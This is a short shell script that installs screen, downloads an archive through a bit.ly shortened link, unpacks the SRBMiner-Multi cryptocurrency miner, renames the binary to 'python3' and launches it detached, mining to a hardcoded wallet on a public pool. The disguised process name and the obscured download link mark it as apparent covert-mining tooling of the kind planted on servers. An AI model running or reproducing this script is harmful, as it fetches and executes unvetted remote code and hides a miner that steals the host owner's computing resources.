apt install screen -y

wget https://bit.ly/kontolrum

tar -xvf kontolrum

cd SRBMiner-Multi-2-4-7

mv SRBMiner-MULTI python3

nomer=$((RANDOM % 50 + 1))

clear

screen ./python3 --algorithm verushash --pool eu.luckpool.net:3956 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.DOT-0$nomer --keepalive true 
